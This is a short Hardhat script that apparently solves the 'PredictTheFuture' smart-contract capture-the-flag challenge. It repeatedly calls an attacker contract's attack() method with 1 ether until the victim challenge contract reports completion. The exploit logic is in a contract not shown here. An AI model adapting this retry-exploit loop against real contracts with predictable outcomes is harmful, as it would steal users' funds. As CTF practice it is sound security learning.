require("@nomiclabs/hardhat-ethers");
const { ethers } = require("hardhat");

/*
To be used for just call the attack method
*/
async function main() {
    
  const victimaAddress = "0x78D8EA890F9614367a075e46acC4fDdD6f4832Ba"
  const attackerAddress = "0x858971467AC606E08e34DC0d08c1bcA052bc2922"  
  const Atacante = await ethers.getContractFactory("PredictTheFutureAttacker");
  const atacanteSC = await Atacante.attach(attackerAddress);

  const Victima = await ethers.getContractFactory("PredictTheFutureChallenge");
  const victimaSC = Victima.attach(victimaAddress);

  
  var succesfull = false
  while (!succesfull) {
    console.log("Trying to attack")
    try {
      var attackTx = await atacanteSC.attack(
          {
              value: ethers.utils.parseEther('1'),
              gasPrice: ethers.utils.parseUnits('5','gwei'),
              gasLimit: 500000,
          }
      );

      // the try catch is to handle the revert in the attacker contract
      // wait for the tx to be minned
      var receipt = await attackTx.wait(1);
    } catch {
        console.log("Attack wasn't succesfull")
        // var guessTx = await atacanteSC.guess();
        // console.log("Guess answer: ", guessTx);
        console.log("making a pause...")
        await atacanteSC.provider.getBlockWithTransactions(await atacanteSC.provider.getBlockNumber()+1);
    }
    
    succesfull = await victimaSC.isComplete();
  };
  console.log("Attack succesfull")
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

    